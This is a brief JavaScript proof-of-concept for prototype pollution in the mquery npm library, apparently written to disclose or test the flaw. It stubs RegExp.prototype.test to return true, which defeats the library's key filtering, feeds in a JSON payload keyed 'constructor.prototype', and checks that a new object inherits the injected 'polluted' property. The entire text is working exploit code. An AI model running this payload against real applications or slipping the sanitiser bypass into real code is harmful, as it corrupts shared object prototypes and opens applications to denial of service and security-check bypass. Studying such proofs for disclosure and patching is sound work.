RegExp.prototype.test = () => true;
const mquery = require('mquery');
let obj = {};
var payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
console.log({}.polluted);
var m = mquery(payload);
console.log({}.polluted);